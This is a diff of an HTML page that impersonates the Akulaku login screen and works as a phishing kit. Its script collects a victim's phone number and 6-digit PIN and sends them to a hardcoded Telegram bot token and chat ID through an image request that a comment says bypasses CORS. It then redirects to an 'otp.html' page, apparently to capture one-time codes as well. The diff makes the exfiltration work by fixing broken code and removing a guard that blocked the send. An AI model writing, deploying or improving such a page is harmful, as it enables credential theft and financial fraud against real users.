@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Akulaku</title>
     <style>
-        /* Reset Dasar */
         * {
             margin: 0;
             padding: 0;
@@ -21,7 +20,6 @@
             min-height: 100vh;
         }
 
-        /* Container Utama */
         .login-container {
             background-color: #ffffff;
             width: 100%;
@@ -32,9 +30,8 @@
             text-align: center;
         }
 
-        /* Styling Logo Gambar */
         .logo-img {
-            width: 150px; /* Atur ukuran logo */
+            width: 150px;
             margin-bottom: 10px;
             object-fit: contain;
         }
@@ -45,7 +42,6 @@
             margin-bottom: 30px;
         }
 
-        /* Form Input */
         .input-group {
             margin-bottom: 20px;
             text-align: left;
@@ -65,34 +61,30 @@
             border: 1px solid #e0e0e0;
             border-radius: 8px;
             font-size: 14px;
-            transition: border-color 0.3s;
             outline: none;
         }
 
         .input-group input:focus {
-            border-color: #D32F2F; /* Merah saat fokus */
+            border-color: #D32F2F;
         }
 
-        /* Tombol Login (WARNA MERAH) */
         .btn-login {
             width: 100%;
             padding: 14px;
-            background-color: #D32F2F; /* Warna Merah Pekat */
+            background-color: #D32F2F;
             color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.3s;
             margin-top: 10px;
         }
 
         .btn-login:hover {
-            background-color: #B71C1C; /* Merah lebih gelap saat hover */
+            background-color: #B71C1C;
         }
 
-        /* Link Bantu */
         .helper-links {
             margin-top: 20px;
             display: flex;
@@ -107,10 +99,8 @@
 
         .helper-links a:hover {
             color: #D32F2F;
-            text-decoration: underline;
         }
 
-        /* Footer Daftar */
         .footer-register {
             margin-top: 40px;
             font-size: 14px;
@@ -122,39 +112,12 @@
             font-weight: 600;
             text-decoration: none;
         }
-        
-        /* Loading Spinner */
-        .spinner {
-            display: none;
-            margin-left: 10px;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #ffffff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        /* Error Message */
-        .error-msg {
-            color: #D32F2F;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
-        }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <!-- Logo Menggunakan URL Anda -->
         <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo Akulaku" class="logo-img">
-        
         <div class="sub-logo">Belanja sekarang, bayar nanti</div>
 
         <form id="loginForm">
@@ -166,13 +129,9 @@
             <div class="input-group">
                 <label for="pin">PIN (6 Digit)</label>
                 <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="Masukkan 6 digit PIN" required>
-                <div class="error-msg" id="errorMsg">PIN harus 6 digit angka</div>
             </div>
 
-            <button type="submit" class="btn-login" id="submitBtn">
-                <span>Masuk</span>
-                <div class="spinner" id="loadingSpinner"></div>
-            </button>
+            <button type="submit" class="btn-login">Masuk</button>
         </form>
 
         <div class="helper-links">
@@ -186,60 +145,34 @@
     </div>
 
     <script>
-        // --- KONFIGURASI TELEGRAM BOT ANDA ---
-        const BOT_TOKEN = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk'; // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
-        const CHAT_ID = '5529657606'; // Chat ID Anda
-        // -------------------------------------
+        // --- ISI TOKEN DAN CHAT ID ANDA DI BAWAH INI ---
+        const BOT_TOKEN = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';    // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+        const CHAT_ID = '5529657606';        // Contoh: 123456789
+        // ------------------------------------------------
 
-        document('loginForm').addEventListener('submit', async function.getElementById(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const phone = document.getElementById('phone').value;
             const pin = document.getElementById('pin').value;
-            const btn = document.getElementById('submitBtn');
-            const spinner = document.getElementById('loadingSpinner');
-            const btnText = btn.querySelector('span');
-            const errorMsg = document.getElementById('errorMsg');
 
-            // Validasi panjang PIN
-            if (pin.length !== 6 || isNaN(pin)) {
-                errorMsg.style.display = 'block';
+            // Validasi PIN harus 6 digit
+            if (pin.length !== 6) {
+                alert('PIN harus 6 digit!');
                 return;
-            } else {
-                errorMsg.style.display = 'none';
             }
 
-            // Tampilkan Loading
-            btn.disabled = true;
-            btnText.textContent = "Memproses...";
-            spinner.style.display = "inline-block";
+            // Kirim data ke Telegram
+            const message = `🔔 LOGIN AKULAKU\n\n📱 Nomor: ${phone}\n🔐 PIN: ${pin}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            // Buat request gambar (cara bypass CORS)
+            new Image().src = url;
 
-            // --- KIRIM DATA KE TELEGRAM ---
-            if (BOT_TOKEN !== '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk' && CHAT_ID !== '5529657606') {
-                const message = `🔔 *Login Baru Akulaku*\n\n📱 Nomor: ${phone}\n🔐 PIN: ${pin}`;
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                } catch (error) {
-                    console.error('Gagal kirim ke Telegram:', error);
-                }
-            }
-
-            // --- ALIHKAN KE HALAMAN SELANJUTNYA ---
-            // Ganti 'home.html' dengan URL halaman tujuan Anda
+            // Redirect ke halaman utama (ganti URL sesuai kebutuhan)
             setTimeout(() => {
                 window.location.href = "otp.html";
-            }, 1000); // Dialihkan setelah 1 detik
+            }, 500);
         });
     </script>
 
